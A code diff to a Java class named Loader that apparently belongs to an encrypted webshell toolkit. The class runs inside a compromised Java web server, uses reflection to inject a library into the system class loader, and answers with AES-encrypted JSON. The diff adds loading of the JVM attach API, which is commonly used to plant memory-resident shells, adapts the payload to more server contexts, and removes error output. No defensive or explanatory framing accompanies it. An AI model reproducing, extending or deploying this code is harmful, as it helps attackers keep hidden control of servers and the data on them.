@@ -14,7 +14,6 @@ import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class Loader {
    public static String libPath;
@@ -23,18 +22,16 @@ public class Loader {
    private HttpSession Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
       HashMap result = new HashMap();
 
       try {
+         this.fillContext(obj);
          URL url = (new File(libPath)).toURI().toURL();
          URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
          Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
          add.setAccessible(true);
          add.invoke(urlClassLoader, url);
+         Class c = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
          result.put("status", "success");
       } catch (Exception var8) {
          result.put("status", "fail");
@@ -46,9 +43,7 @@ public class Loader {
          so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
-         page.getOut().clear();
       } catch (Exception var7) {
-         var7.printStackTrace();
       }
 
       return true;
@@ -119,5 +114,20 @@ public class Loader {
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
       return encrypted;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
